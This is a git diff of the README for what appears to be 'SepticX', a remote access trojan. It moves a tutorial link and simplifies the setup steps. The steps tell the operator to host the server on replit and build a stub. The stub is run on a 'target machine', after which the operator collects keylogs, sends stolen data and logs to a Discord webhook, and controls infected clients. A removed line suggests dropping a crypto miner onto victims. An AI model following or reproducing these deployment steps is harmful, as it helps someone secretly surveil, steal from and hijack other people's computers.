@@ -44,6 +44,9 @@ https://www.virustotal.com/gui/file/f0000196e13bf8c69cb7991eeb9e231184de3daa13a6
 
 
 Setup can be done pretty quickly!<br>
+[Full tutorial here](https://www.veed.io/view/051c67a5-13a0-46bd-869f-1709f72eed36?panel=share)
+
+
  - Upload the contents of the server folder into replit
  - delete `main.py` and remame `server.py` to `main.py`
 
@@ -52,24 +55,15 @@ Setup can be done pretty quickly!<br>
     
         - This is the same key you will use when building the rat
 
-    - For `t` replace it with your a discord token, so it can dynamically generate webhooks
-
-    - `webhook_generation_logs` is the channel where the log of all webhooks being generated will go and `backup_webhook` is a backup webhook incase it fails to create a webhook
-
-    - The `channel_id` and `channel_id2` are the discord channels where the webhooks will be generated, set them to two different channels in case something happens to the first channel
+    - For `webhook` replace it with your a discord webhook, this is where all updates and logs will be sent.
 
  - Once you've setup your replit, run compiler.py, and either put your config inside config.json and use that or type in your config manually
-
-- Inside your replit replace output.exe with the stub you created with compiler.py, and logger.exe with whatever file you want, like a crypto miner for example
 
  - Then run it on a target machine and it should connect
 
  - To see your keylogs check the logs folder on the replit, everything else will be sent to your discord webhook and finally run `controller.py` to control any connected clients
 
 ![image](https://github.com/TheonlyIcebear/SepticX/assets/78031685/8a74f54f-3f74-4f78-8a4a-bbcb5648611f)
-
-
-[Full tutorial here](https://www.veed.io/view/051c67a5-13a0-46bd-869f-1709f72eed36?panel=share)
 
 
 ### Extra
